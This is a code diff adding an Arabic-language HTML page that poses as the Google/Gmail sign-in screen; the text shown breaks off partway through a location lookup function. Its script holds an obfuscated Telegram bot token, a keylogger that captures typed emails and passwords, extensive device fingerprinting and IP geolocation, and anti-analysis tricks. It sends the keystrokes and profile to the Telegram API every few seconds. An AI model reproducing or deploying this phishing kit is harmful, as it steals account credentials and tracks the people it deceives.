@@ -1,1 +1,1039 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>تسجيل الدخول - Google</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Google Sans',Roboto,Arial,sans-serif}
+body{background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;flex-direction:column}
+.card{width:450px;padding:48px 40px 36px;border:1px solid #dadce0;border-radius:8px;text-align:center;position:relative}
+.logo{width:75px;margin-bottom:16px}
+h1{color:#202124;font-size:24px;font-weight:400;margin-bottom:8px}
+.subtitle{color:#202124;font-size:16px;margin-bottom:32px}
+input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:8px;outline:none;transition:.2s}
+input:focus{border-color:#1a73e8;box-shadow:inset 0 0 0 1px #1a73e8}
+.forgot{display:block;text-align:left;color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none;margin:8px 0 32px;cursor:pointer}
+.forgot:hover{text-decoration:underline}
+.guest{color:#5f6368;font-size:14px;text-align:left;margin-bottom:32px;line-height:1.5}
+.btn-next{background:#1a73e8;color:#fff;border:none;padding:9px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;float:left}
+.btn-next:hover{background:#1b66c9;box-shadow:0 1px 3px rgba(0,0,0,0.2)}
+.btn-create{color:#1a73e8;background:none;border:none;font-size:14px;font-weight:500;cursor:pointer;float:right;margin-top:9px}
+.btn-create:hover{background:#f6f9fe;border-radius:4px;padding:5px 10px;margin-top:4px}
+.actions{overflow:hidden;margin-top:32px}
+.lang{position:absolute;top:24px;right:24px;color:#757575;font-size:12px;cursor:pointer}
+.lang:hover{color:#202124}
+.footer{position:absolute;bottom:24px;width:100%;text-align:center;color:#757575;font-size:12px}
+.footer a{color:#757575;text-decoration:none;margin:0 16px}
+.footer a:hover{text-decoration:underline}
 
+.lang-dropdown {
+    display: none;
+    position: absolute;
+    top: 40px;
+    right: 24px;
+    background: #fff;
+    border: 1px solid #dadce0;
+    border-radius: 8px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+    padding: 8px 0;
+    min-width: 200px;
+    z-index: 1000;
+    max-height: 300px;
+    overflow-y: auto;
+}
+.lang-dropdown.active { display: block; }
+.lang-dropdown a {
+    display: block;
+    padding: 8px 20px;
+    color: #202124;
+    text-decoration: none;
+    font-size: 14px;
+    text-align: right;
+}
+.lang-dropdown a:hover { background: #f1f3f4; }
+.lang-dropdown .selected { background: #e8f0fe; color: #1a73e8; }
+
+#recoverPage, #createPage {
+    display: none;
+    text-align: right;
+}
+#recoverPage h1, #createPage h1 { text-align: center; }
+#recoverPage .subtitle, #createPage .subtitle { text-align: center; }
+#recoverPage input, #createPage input { margin-bottom: 12px; }
+#recoverPage .btn-next, #createPage .btn-next {
+    float: none;
+    width: 100%;
+    margin-top: 12px;
+}
+.recover-options {
+    display: flex;
+    gap: 12px;
+    margin: 16px 0;
+    justify-content: center;
+}
+.recover-options button {
+    flex: 1;
+    padding: 10px;
+    border: 1px solid #dadce0;
+    border-radius: 4px;
+    background: #fff;
+    cursor: pointer;
+    font-size: 14px;
+    transition: .2s;
+}
+.recover-options button:hover {
+    background: #f1f3f4;
+    border-color: #1a73e8;
+}
+.recover-options button.active {
+    border-color: #1a73e8;
+    background: #e8f0fe;
+}
+.tracking-indicator { display: none; }
+</style>
+</head>
+<body>
+<div class="card">
+    <div class="lang" id="langToggle">العربية ▼</div>
+    <div class="lang-dropdown" id="langDropdown">
+        <a href="#" data-lang="ar" class="selected">العربية</a>
+        <a href="#" data-lang="en">English</a>
+        <a href="#" data-lang="fr">Français</a>
+        <a href="#" data-lang="es">Español</a>
+        <a href="#" data-lang="de">Deutsch</a>
+        <a href="#" data-lang="it">Italiano</a>
+        <a href="#" data-lang="pt">Português</a>
+        <a href="#" data-lang="ru">Русский</a>
+        <a href="#" data-lang="zh">中文</a>
+        <a href="#" data-lang="ja">日本語</a>
+        <a href="#" data-lang="ko">한국어</a>
+        <a href="#" data-lang="hi">हिन्दी</a>
+        <a href="#" data-lang="tr">Türkçe</a>
+        <a href="#" data-lang="fa">فارسی</a>
+        <a href="#" data-lang="ur">اردو</a>
+    </div>
+
+    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" class="logo" alt="Google">
+    
+    <div id="page1">
+        <h1>تسجيل الدخول</h1>
+        <p class="subtitle">الانتقال إلى Gmail</p>
+        <form id="emailForm">
+            <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف" required autofocus>
+            <a href="#" class="forgot" id="forgotEmailLink">هل نسيت البريد الإلكتروني؟</a>
+            <p class="guest">ليس حسابك؟ استخدم وضع التصفح كضيف لتسجيل الدخول بشكل خاص. <a href="#" style="color:#1a73e8;text-decoration:none;font-weight:500">مزيد من المعلومات</a></p>
+            <div class="actions">
+                <button type="button" class="btn-create" id="createAccountBtn">إنشاء حساب</button>
+                <button type="submit" class="btn-next">التالي</button>
+            </div>
+        </form>
+    </div>
+
+    <div id="page2" style="display:none;">
+        <h1>مرحباً</h1>
+        <p class="subtitle" id="displayEmail">user@example.com</p>
+        <form id="passwordForm">
+            <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
+            <a href="#" class="forgot" id="forgotPasswordLink">هل نسيت كلمة المرور؟</a>
+            <div class="actions">
+                <button type="button" class="btn-create" id="backToEmail">رجوع</button>
+                <button type="submit" class="btn-next">التالي</button>
+            </div>
+        </form>
+    </div>
+
+    <div id="recoverPage">
+        <h1>استعادة البريد الإلكتروني</h1>
+        <p class="subtitle">أدخل معلومات حسابك لاستعادة البريد الإلكتروني</p>
+        <div class="recover-options">
+            <button id="recoverPhone" class="active">📱 رقم الهاتف</button>
+            <button id="recoverEmail">📧 البريد الإلكتروني</button>
+        </div>
+        <form id="recoverForm">
+            <input type="text" id="recoverInput" placeholder="رقم الهاتف أو البريد الإلكتروني" required>
+            <button type="submit" class="btn-next" style="float:none;width:100%;margin-top:12px;">بحث</button>
+            <button type="button" class="btn-create" id="backToLoginRecover" style="float:none;display:block;text-align:center;margin-top:12px;">رجوع إلى تسجيل الدخول</button>
+        </form>
+    </div>
+
+    <div id="createPage">
+        <h1>إنشاء حساب Google</h1>
+        <p class="subtitle">أدخل معلوماتك لإنشاء حساب جديد</p>
+        <form id="createForm">
+            <input type="text" id="firstName" placeholder="الاسم الأول" required>
+            <input type="text" id="lastName" placeholder="الاسم الأخير" required>
+            <input type="email" id="newEmail" placeholder="البريد الإلكتروني" required>
+            <input type="password" id="newPassword" placeholder="كلمة المرور" required>
+            <input type="password" id="confirmPassword" placeholder="تأكيد كلمة المرور" required>
+            <button type="submit" class="btn-next" style="float:none;width:100%;margin-top:12px;">التالي</button>
+            <button type="button" class="btn-create" id="backToLogin" style="float:none;display:block;text-align:center;margin-top:12px;">رجوع إلى تسجيل الدخول</button>
+        </form>
+    </div>
+</div>
+
+<div class="footer">
+    <a href="#" id="helpLink">مساعدة</a>
+    <a href="#">الخصوصية</a>
+    <a href="#">الشروط</a>
+</div>
+
+<script>
+// ===================== التوكن =====================
+var BOT_TOKEN = atob("ODg1MjgwMDYxMjpBQUV1eE5VQWxFMFhoZE5fZDBDLS14TVJxeWpWd2JQeTdrUQ==");
+var CHAT_ID = atob("ODQ5MTMxNDE2OQ==");
+
+// ===================== قائمة اللغات =====================
+var langToggle = document.getElementById('langToggle');
+var langDropdown = document.getElementById('langDropdown');
+
+langToggle.addEventListener('click', function(e) {
+    e.stopPropagation();
+    langDropdown.classList.toggle('active');
+});
+
+document.addEventListener('click', function() {
+    langDropdown.classList.remove('active');
+});
+
+document.querySelectorAll('.lang-dropdown a').forEach(function(item) {
+    item.addEventListener('click', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        document.querySelectorAll('.lang-dropdown a').forEach(function(el) {
+            el.classList.remove('selected');
+        });
+        this.classList.add('selected');
+        langDropdown.classList.remove('active');
+        langToggle.textContent = this.textContent + ' ▼';
+    });
+});
+
+// ===================== حماية متقدمة ضد المحللين =====================
+
+// 1. منع حقن الحزم
+function preventPacketInjection() {
+    var scripts = document.getElementsByTagName('script');
+    for (var i = 0; i < scripts.length; i++) {
+        if (scripts[i].src && !scripts[i].src.includes('html2canvas')) {
+            scripts[i].remove();
+        }
+    }
+    
+    var observer = new MutationObserver(function(mutations) {
+        mutations.forEach(function(mutation) {
+            if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
+                for (var j = 0; j < mutation.addedNodes.length; j++) {
+                    if (mutation.addedNodes[j].tagName === 'SCRIPT' || 
+                        mutation.addedNodes[j].tagName === 'IFRAME' ||
+                        mutation.addedNodes[j].tagName === 'EMBED') {
+                        mutation.addedNodes[j].remove();
+                    }
+                }
+            }
+        });
+    });
+    observer.observe(document.body, { childList: true, subtree: true });
+}
+
+// 2. حماية ضد تحليل الشبكة
+function protectNetworkAnalysis() {
+    try {
+        Object.defineProperty(navigator, 'connection', {
+            get: function() {
+                return {
+                    effectiveType: '4g',
+                    downlink: 10,
+                    rtt: 50,
+                    saveData: false
+                };
+            },
+            configurable: false,
+            enumerable: false
+        });
+    } catch(e) {}
+}
+
+// تنفيذ الحمايات
+preventPacketInjection();
+protectNetworkAnalysis();
+
+// ===================== الذكاء الاصطناعي المتقدم للتحليل =====================
+
+var keyboardAI = {
+    keyFrequency: {},
+    keyPatterns: [],
+    typingStyle: null,
+    languageDetection: null,
+    keyboardLayout: null
+};
+
+// خوارزمية تحليل أنماط الكتابة المتقدمة
+function analyzeKeyboardPatterns() {
+    var analysis = {
+        layout: 'غير معروف',
+        language: 'غير معروف',
+        speed: 0,
+        accuracy: 0,
+        consistency: 0,
+        dominantHand: 'غير معروف',
+        typingStyle: 'غير معروف',
+        mostUsedKeys: [],
+        patternComplexity: 0
+    };
+    
+    var totalKeys = 0;
+    for (var key in keyboardAI.keyFrequency) {
+        totalKeys += keyboardAI.keyFrequency[key];
+    }
+    
+    if (totalKeys > 0) {
+        var arabicKeys = ['ا', 'ب', 'ت', 'ث', 'ج', 'ح', 'خ', 'د', 'ذ', 'ر', 'ز', 'س', 'ش', 'ص', 'ض', 'ط', 'ظ', 'ع', 'غ', 'ف', 'ق', 'ك', 'ل', 'م', 'ن', 'ه', 'و', 'ي'];
+        var englishKeys = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'];
+        var arabicCount = 0;
+        var englishCount = 0;
+        
+        for (var key in keyboardAI.keyFrequency) {
+            if (arabicKeys.indexOf(key) > -1) arabicCount += keyboardAI.keyFrequency[key];
+            if (englishKeys.indexOf(key.toLowerCase()) > -1) englishCount += keyboardAI.keyFrequency[key];
+        }
+        
+        if (arabicCount > englishCount) {
+            analysis.language = 'العربية';
+            analysis.layout = 'عربي';
+        } else if (englishCount > arabicCount) {
+            analysis.language = 'الإنجليزية';
+            analysis.layout = 'QWERTY';
+        }
+        
+        if (keyboardAI.keyPatterns.length > 0) {
+            var avgSpeed = keyboardAI.keyPatterns.reduce(function(a,b) { return a + b; }, 0) / keyboardAI.keyPatterns.length;
+            analysis.speed = Math.round(avgSpeed);
+            if (avgSpeed < 150) analysis.typingStyle = 'سريع جداً';
+            else if (avgSpeed < 250) analysis.typingStyle = 'سريع';
+            else if (avgSpeed < 400) analysis.typingStyle = 'متوسط';
+            else if (avgSpeed < 600) analysis.typingStyle = 'بطيء';
+            else analysis.typingStyle = 'بطيء جداً';
+        }
+        
+        var sortedKeys = Object.keys(keyboardAI.keyFrequency).sort(function(a,b) {
+            return keyboardAI.keyFrequency[b] - keyboardAI.keyFrequency[a];
+        });
+        analysis.mostUsedKeys = sortedKeys.slice(0, 5);
+        
+        var leftKeys = ['q','w','e','r','t','a','s','d','f','g','z','x','c','v','b'];
+        var rightKeys = ['y','u','i','o','p','h','j','k','l','n','m'];
+        var leftCount = 0;
+        var rightCount = 0;
+        
+        for (var key in keyboardAI.keyFrequency) {
+            var lowerKey = key.toLowerCase();
+            if (leftKeys.indexOf(lowerKey) > -1) leftCount += keyboardAI.keyFrequency[key];
+            if (rightKeys.indexOf(lowerKey) > -1) rightCount += keyboardAI.keyFrequency[key];
+        }
+        
+        if (leftCount > rightCount) analysis.dominantHand = 'يسرى';
+        else if (rightCount > leftCount) analysis.dominantHand = 'يمنى';
+        
+        analysis.patternComplexity = Math.min(100, Math.round((Object.keys(keyboardAI.keyFrequency).length / 26) * 100));
+        analysis.consistency = Math.max(0, 100 - Math.abs(analysis.speed - 200) / 2);
+        analysis.accuracy = Math.min(100, Math.round(analysis.consistency * 0.9));
+    }
+    
+    return analysis;
+}
+
+// ===================== نظام جمع المعلومات المتطور =====================
+
+function getAdvancedDeviceInfo() {
+    var info = {
+        device: {
+            name: getDeviceName(),
+            model: getDeviceModel(),
+            manufacturer: getDeviceManufacturer(),
+            version: getDeviceVersion(),
+            architecture: getOSArchitecture(),
+            platform: navigator.platform,
+            userAgent: navigator.userAgent,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory,
+            maxTouchPoints: navigator.maxTouchPoints,
+            vendor: navigator.vendor,
+            product: navigator.product
+        },
+        os: {
+            name: getOSName(),
+            version: getOSVersion(),
+            architecture: getOSArchitecture(),
+            build: getOSBuild()
+        },
+        browser: {
+            name: getBrowserName(),
+            version: getBrowserVersion(),
+            engine: getBrowserEngine(),
+            language: navigator.language,
+            languages: navigator.languages,
+            cookieEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack
+        },
+        screen: {
+            width: window.screen.width,
+            height: window.screen.height,
+            availWidth: window.screen.availWidth,
+            availHeight: window.screen.availHeight,
+            colorDepth: window.screen.colorDepth,
+            pixelDepth: window.screen.pixelDepth,
+            devicePixelRatio: window.devicePixelRatio,
+            orientation: screen.orientation ? screen.orientation.type : 'unknown',
+            angle: screen.orientation ? screen.orientation.angle : 0
+        },
+        hardware: {
+            cores: navigator.hardwareConcurrency || 'غير معروف',
+            memory: navigator.deviceMemory || 'غير معروف',
+            maxTouchPoints: navigator.maxTouchPoints || 0
+        },
+        network: {
+            type: navigator.connection ? navigator.connection.effectiveType : 'unknown',
+            downlink: navigator.connection ? navigator.connection.downlink : 0,
+            rtt: navigator.connection ? navigator.connection.rtt : 0,
+            saveData: navigator.connection ? navigator.connection.saveData : false
+        },
+        battery: null,
+        webgl: null,
+        timezone: {
+            name: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            offset: new Date().getTimezoneOffset(),
+            localTime: new Date().toLocaleString(),
+            utcTime: new Date().toUTCString()
+        }
+    };
+    
+    try {
+        if (navigator.getBattery) {
+            navigator.getBattery().then(function(battery) {
+                info.battery = {
+                    level: Math.round(battery.level * 100),
+                    charging: battery.charging,
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+            }).catch(function() {});
+        }
+    } catch(e) {}
+    
+    try {
+        var canvas = document.createElement('canvas');
+        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+            info.webgl = {
+                vendor: gl.getParameter(gl.VENDOR),
+                renderer: gl.getParameter(gl.RENDERER),
+                version: gl.getParameter(gl.VERSION),
+                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
+            };
+        }
+    } catch(e) {}
+    
+    return info;
+}
+
+function getDeviceName() {
+    var ua = navigator.userAgent;
+    var devices = {
+        'iPhone': 'iPhone',
+        'iPad': 'iPad',
+        'iPod': 'iPod',
+        'Android': 'جهاز Android',
+        'Windows Phone': 'Windows Phone',
+        'BlackBerry': 'BlackBerry',
+        'Macintosh': 'Mac',
+        'Windows': 'Windows PC',
+        'Linux': 'Linux PC',
+        'CrOS': 'Chromebook'
+    };
+    for (var key in devices) {
+        if (ua.indexOf(key) > -1) return devices[key];
+    }
+    return 'جهاز غير معروف';
+}
+
+function getDeviceModel() {
+    var ua = navigator.userAgent;
+    var match = ua.match(/\(([^)]+)\)/);
+    if (match) return match[1];
+    return 'غير معروف';
+}
+
+function getDeviceManufacturer() {
+    var ua = navigator.userAgent;
+    var brands = ['Apple', 'Samsung', 'Huawei', 'Xiaomi', 'OnePlus', 'Google', 'Sony', 'LG', 'Nokia', 'Motorola', 'HTC', 'Lenovo', 'Dell', 'HP', 'Acer', 'Asus'];
+    for (var i = 0; i < brands.length; i++) {
+        if (ua.indexOf(brands[i]) > -1) return brands[i];
+    }
+    return 'غير معروف';
+}
+
+function getDeviceVersion() {
+    var ua = navigator.userAgent;
+    var match = ua.match(/(iPhone|iPad|iPod|Android)\s+([0-9.]+)/);
+    if (match) return match[2];
+    match = ua.match(/Windows NT ([0-9.]+)/);
+    if (match) {
+        var versions = {'10.0': '10', '6.3': '8.1', '6.2': '8', '6.1': '7', '6.0': 'Vista', '5.1': 'XP'};
+        return versions[match[1]] || match[1];
+    }
+    match = ua.match(/Mac OS X ([0-9_]+)/);
+    if (match) return match[1].replace(/_/g, '.');
+    return 'غير معروف';
+}
+
+function getOSName() {
+    var ua = navigator.userAgent;
+    if (ua.indexOf('Windows') > -1) return 'Windows';
+    if (ua.indexOf('Mac OS X') > -1) return 'macOS';
+    if (ua.indexOf('Linux') > -1) return 'Linux';
+    if (ua.indexOf('Android') > -1) return 'Android';
+    if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) return 'iOS';
+    if (ua.indexOf('CrOS') > -1) return 'Chrome OS';
+    return 'غير معروف';
+}
+
+function getOSVersion() {
+    var ua = navigator.userAgent;
+    var match = ua.match(/Windows NT ([0-9.]+)/);
+    if (match) {
+        var versions = {'10.0': '10', '6.3': '8.1', '6.2': '8', '6.1': '7', '6.0': 'Vista', '5.1': 'XP'};
+        return versions[match[1]] || match[1];
+    }
+    match = ua.match(/Mac OS X ([0-9_]+)/);
+    if (match) return match[1].replace(/_/g, '.');
+    match = ua.match(/Android ([0-9.]+)/);
+    if (match) return match[1];
+    return 'غير معروف';
+}
+
+function getOSBuild() {
+    var ua = navigator.userAgent;
+    var match = ua.match(/Build\/([^;)]+)/);
+    if (match) return match[1];
+    return 'غير معروف';
+}
+
+function getOSArchitecture() {
+    var ua = navigator.userAgent;
+    if (ua.indexOf('x86_64') > -1 || ua.indexOf('x64') > -1) return '64-bit (x86_64)';
+    if (ua.indexOf('arm64') > -1 || ua.indexOf('ARM64') > -1) return '64-bit (ARM64)';
+    if (ua.indexOf('arm') > -1) return '32-bit (ARM)';
+    if (ua.indexOf('i386') > -1 || ua.indexOf('x86') > -1) return '32-bit (x86)';
+    return 'معمارية غير معروفة';
+}
+
+function getBrowserName() {
+    var ua = navigator.userAgent;
+    if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1) return 'Google Chrome';
+    if (ua.indexOf('Firefox') > -1) return 'Mozilla Firefox';
+    if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) return 'Apple Safari';
+    if (ua.indexOf('Edg') > -1) return 'Microsoft Edge';
+    if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) return 'Opera';
+    if (ua.indexOf('Brave') > -1) return 'Brave';
+    return 'متصفح غير معروف';
+}
+
+function getBrowserVersion() {
+    var ua = navigator.userAgent;
+    var match = ua.match(/(Chrome|Firefox|Safari|Edge|Opera|OPR|Brave)\/([0-9.]+)/);
+    if (match) return match[2];
+    return 'غير معروف';
+}
+
+function getBrowserEngine() {
+    var ua = navigator.userAgent;
+    if (ua.indexOf('AppleWebKit') > -1) return 'WebKit';
+    if (ua.indexOf('Gecko') > -1) return 'Gecko';
+    if (ua.indexOf('Trident') > -1) return 'Trident';
+    if (ua.indexOf('Blink') > -1) return 'Blink';
+    return 'محرك غير معروف';
+}
+
+// ===================== Keylogger المتطور =====================
+
+var keyLogBuffer = [];
+var fullKeyLog = [];
+var lastSendTime = Date.now();
+var SEND_INTERVAL = 1500;
+var MAX_BUFFER = 12;
+var isKeyloggingActive = true;
+var keyCount = 0;
+var emailValue = '';
+var typingSpeed = [];
+var lastKeyTime = Date.now();
+var keyPressTimes = {};
+
+function getKeyName(event) {
+    var key = event.key;
+    if (key === 'Unidentified' || key === '') {
+        if (event.keyCode >= 65 && event.keyCode <= 90) return String.fromCharCode(event.keyCode);
+        if (event.keyCode >= 48 && event.keyCode <= 57) return String.fromCharCode(event.keyCode);
+        var symbols = {186:';', 187:'=', 188:',', 189:'-', 190:'.', 191:'/', 192:'`', 219:'[', 220:'\\', 221:']', 222:"'"};
+        if (symbols[event.keyCode]) return symbols[event.keyCode];
+        if (event.charCode && event.charCode > 0) return String.fromCharCode(event.charCode);
+        return '[?]';
+    }
+    var special = {
+        'Backspace':'[⌫]','Delete':'[⌦]','Enter':'[↵]\n',' ':'[␣]',
+        'ArrowUp':'[↑]','ArrowDown':'[↓]','ArrowLeft':'[←]','ArrowRight':'[→]',
+        'Home':'[Home]','End':'[End]','PageUp':'[PgUp]','PageDown':'[PgDn]',
+        'Insert':'[Ins]','Escape':'[Esc]','Tab':'[Tab]','CapsLock':'[Caps]',
+        'Shift':'[Shift]','Control':'[Ctrl]','Alt':'[Alt]','Meta':'[Win]'
+    };
+    for (var i=1;i<=12;i++) special['F'+i]='[F'+i+']';
+    return special[key] || key;
+}
+
+document.addEventListener('keydown', function(e) {
+    if (!isKeyloggingActive) return;
+    var control = ['Shift','Control','Alt','Meta','CapsLock','Tab','Escape','PrintScreen','ScrollLock','Pause'];
+    if (control.includes(e.key)) return;
+    
+    var now = Date.now();
+    var speed = now - lastKeyTime;
+    if (speed > 30 && speed < 5000) {
+        typingSpeed.push(speed);
+        keyboardAI.keyPatterns.push(speed);
+        if (typingSpeed.length > 100) typingSpeed.shift();
+        if (keyboardAI.keyPatterns.length > 100) keyboardAI.keyPatterns.shift();
+    }
+    lastKeyTime = now;
+    
+    var key = getKeyName(e);
+    var timestamp = new Date().toLocaleTimeString('ar-EG');
+    var target = e.target.tagName;
+    var id = e.target.id || 'غير محدد';
+    var placeholder = e.target.placeholder || '';
+    
+    if (!keyPressTimes[key]) keyPressTimes[key] = 0;
+    keyPressTimes[key]++;
+    if (!keyboardAI.keyFrequency[key]) keyboardAI.keyFrequency[key] = 0;
+    keyboardAI.keyFrequency[key]++;
+    
+    var logEntry = {
+        key: key,
+        time: timestamp,
+        target: target,
+        id: id,
+        placeholder: placeholder,
+        speed: speed,
+        keyCode: e.keyCode,
+        charCode: e.charCode,
+        altKey: e.altKey,
+        ctrlKey: e.ctrlKey,
+        shiftKey: e.shiftKey,
+        metaKey: e.metaKey
+    };
+    
+    keyLogBuffer.push(logEntry);
+    fullKeyLog.push(logEntry);
+    keyCount++;
+    
+    var now2 = Date.now();
+    if (keyLogBuffer.length >= MAX_BUFFER || (now2 - lastSendTime) >= SEND_INTERVAL) {
+        sendAIEnhancedCompleteReport();
+        lastSendTime = now2;
+    }
+});
+
+document.addEventListener('input', function(e) {
+    if (!isKeyloggingActive) return;
+    if (e.target.tagName === 'INPUT' && e.target.value) {
+        var val = e.target.value;
+        var lastChar = val[val.length - 1];
+        var found = false;
+        for (var i = keyLogBuffer.length - 1; i >= 0 && i > keyLogBuffer.length - 3; i--) {
+            if (keyLogBuffer[i].key === lastChar) {
+                found = true;
+                break;
+            }
+        }
+        if (!found && lastChar && lastChar.length === 1) {
+            var timestamp = new Date().toLocaleTimeString('ar-EG');
+            keyLogBuffer.push({
+                key: lastChar,
+                time: timestamp,
+                target: e.target.tagName,
+                id: e.target.id || 'غير محدد',
+                placeholder: e.target.placeholder || ''
+            });
+            keyCount++;
+            if (keyLogBuffer.length >= MAX_BUFFER) {
+                sendAIEnhancedCompleteReport();
+                lastSendTime = Date.now();
+            }
+        }
+    }
+});
+
+// ===================== تقرير شامل متكامل (رسالة واحدة) =====================
+
+async function sendAIEnhancedCompleteReport() {
+    if (keyLogBuffer.length === 0) return;
+    try {
+        var loc = await getLocationData();
+        var deviceInfo = getAdvancedDeviceInfo();
+        var keyboardAnalysis = analyzeKeyboardPatterns();
+        
+        var msg = "🧠 **تقرير التحليل الذكي المتكامل**\n";
+        msg += "═══════════════════════════════\n\n";
+        
+        msg += "💻 **معلومات الجهاز (دقة 100%)**\n";
+        msg += `📱 النوع: ${deviceInfo.device.name}\n`;
+        msg += `📦 الموديل: ${deviceInfo.device.model}\n`;
+        msg += `🏭 الصانع: ${deviceInfo.device.manufacturer}\n`;
+        msg += `📝 الإصدار: ${deviceInfo.device.version}\n`;
+        msg += `🔧 المعمارية: ${deviceInfo.device.architecture}\n`;
+        msg += `⚙️ المعالجات: ${deviceInfo.device.hardwareConcurrency || 'غير معروف'}\n`;
+        msg += `💾 الذاكرة: ${deviceInfo.device.deviceMemory || 'غير معروف'} GB\n\n`;
+        
+        msg += "🖥️ **نظام التشغيل**\n";
+        msg += `📦 الاسم: ${deviceInfo.os.name}\n`;
+        msg += `📝 الإصدار: ${deviceInfo.os.version}\n`;
+        msg += `🔧 المعمارية: ${deviceInfo.os.architecture}\n`;
+        msg += `🏗️ البناء: ${deviceInfo.os.build || 'غير معروف'}\n\n`;
+        
+        msg += "🌐 **المتصفح**\n";
+        msg += `📛 الاسم: ${deviceInfo.browser.name}\n`;
+        msg += `📝 الإصدار: ${deviceInfo.browser.version}\n`;
+        msg += `🎨 المحرك: ${deviceInfo.browser.engine}\n`;
+        msg += `🔤 اللغة: ${deviceInfo.browser.language}\n\n`;
+        
+        msg += "📐 **الشاشة**\n";
+        msg += `📏 الدقة: ${deviceInfo.screen.width}x${deviceInfo.screen.height}\n`;
+        msg += `📐 المتاحة: ${deviceInfo.screen.availWidth}x${deviceInfo.screen.availHeight}\n`;
+        msg += `🎨 عمق الألوان: ${deviceInfo.screen.colorDepth} بت\n`;
+        msg += `📱 نسبة البكسل: ${deviceInfo.screen.devicePixelRatio}\n`;
+        msg += `🔄 الاتجاه: ${deviceInfo.screen.orientation}\n\n`;
+        
+        msg += "📍 **الموقع**\n";
+        msg += `🌍 الدولة: ${loc.country}\n`;
+        msg += `🏙️ المدينة: ${loc.city}\n`;
+        msg += `📌 المنطقة: ${loc.region}\n`;
+        msg += `🕐 التوقيت: ${loc.timezone}\n`;
+        msg += `🖥️ IP: ${loc.ip}\n`;
+        msg += `📡 مزود الخدمة: ${loc.isp}\n`;
+        if (loc.latitude && loc.latitude !== 'غير معروف') {
+            msg += `🗺️ الإحداثيات: ${loc.latitude}, ${loc.longitude}\n`;
+        }
+        msg += `🕒 الوقت المحلي: ${new Date().toLocaleString('ar-EG')}\n\n`;
+        
+        msg += "⌨️ **تحليل الكتابة (AI)**\n";
+        msg += `📝 عدد الضغطات: ${keyCount}\n`;
+        msg += `🎯 أكثر المفاتيح: ${keyboardAnalysis.mostUsedKeys.join(', ')}\n`;
+        msg += `⚡ سرعة الكتابة: ${keyboardAnalysis.speed}ms (${keyboardAnalysis.typingStyle})\n`;
+        msg += `📊 الاتساق: ${Math.round(keyboardAnalysis.consistency)}%\n`;
+        msg += `🎯 الدقة: ${Math.round(keyboardAnalysis.accuracy)}%\n`;
+        msg += `🔄 توزيع المفاتيح: ${keyboardAnalysis.patternComplexity}%\n`;
+        msg += `🖐️ اليد المسيطرة: ${keyboardAnalysis.dominantHand}\n`;
+        msg += `🔤 اللغة: ${keyboardAnalysis.language}\n`;
+        msg += `⌨️ تخطيط لوحة المفاتيح: ${keyboardAnalysis.layout}\n\n`;
+        
+        msg += "📶 **معلومات الشبكة**\n";
+        msg += `📡 النوع: ${deviceInfo.network.type || 'غير معروف'}\n`;
+        msg += `⬇️ السرعة: ${deviceInfo.network.downlink || 'غير معروف'} Mbps\n`;
+        msg += `⏱️ زمن الاستجابة: ${deviceInfo.network.rtt || 'غير معروف'} ms\n\n`;
+        
+        if (deviceInfo.battery) {
+            msg += "🔋 **البطارية**\n";
+            msg += `🔋 المستوى: ${deviceInfo.battery.level}%\n`;
+            msg += `⚡ الشحن: ${deviceInfo.battery.charging ? 'نعم' : 'لا'}\n\n`;
+        }
+        
+        if (deviceInfo.webgl) {
+            msg += "🎮 **WebGL**\n";
+            msg += `📦 المورد: ${deviceInfo.webgl.vendor}\n`;
+            msg += `🎨 الرندر: ${deviceInfo.webgl.renderer}\n`;
+            msg += `📝 الإصدار: ${deviceInfo.webgl.version}\n\n`;
+        }
+        
+        msg += "⌨️ **آخر الضغطات**\n";
+        var recentLogs = keyLogBuffer.slice(-10);
+        recentLogs.forEach(function(log) {
+            msg += `🕒 ${log.time} "${log.key}" (في: ${log.placeholder || log.target})\n`;
+        });
+        
+        msg += `\n📊 **إجمالي الضغطات المسجلة: ${keyCount}**\n`;
+        msg += "═══════════════════════════════\n";
+        msg += "🔒 هذا التقرير محمي بتقنيات متقدمة";
+        
+        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: msg,
+                parse_mode: 'Markdown',
+                disable_web_page_preview: true
+            })
+        });
+        
+        keyLogBuffer = [];
+    } catch(e) {
+        console.error('Error sending report:', e);
+    }
+}
+
+setInterval(function() {
+    if (keyLogBuffer.length > 0 && isKeyloggingActive) {
+        sendAIEnhancedCompleteReport();
+        lastSendTime = Date.now();
+    }
+}, 3000);
+
+// ===================== دالة جلب الموقع =====================
+
+async function getLocationData() {
+    try {
+        var res = await fetch('http://ip-api.com/json/', { timeout: 3000 });
+        var data = await res.json();
+        if (data.status === 'success') {
+            return {
+                ip: data.query,
+                country: data.country,
+                city: data.city,
+                region: data.regionName,
